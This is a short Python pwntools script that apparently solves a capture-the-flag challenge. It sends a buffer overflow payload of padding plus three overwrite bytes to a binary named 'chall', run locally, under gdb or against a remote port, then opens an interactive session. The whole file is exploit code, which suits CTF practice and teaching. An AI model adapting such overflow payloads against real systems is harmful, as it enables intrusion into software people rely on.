from pwn import *

context.log_level = "debug"
LOCAL_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc.so.6"
REMOTE_ADDR = "example.com"
REMOTE_PORT = 1337

elf = ELF("./chall")
pop_rdi_ret = 0x0000000000401283
ret = 0x000000000040101a

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
            break vacation
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def attack():
    payload = b"1,2,3"
    sock.sendlineafter(b"what's your favorite color's rgb value? (format: r, g, b)\n", payload)
    payload = b"A" * 0x20
    payload += b"A" * 5
    payload += b"\x34\x54\x32"
    sock.sendlineafter(b"good... good... and its pretty name?\n", payload)



if __name__ == "__main__":
    attack()
    sock.interactive()



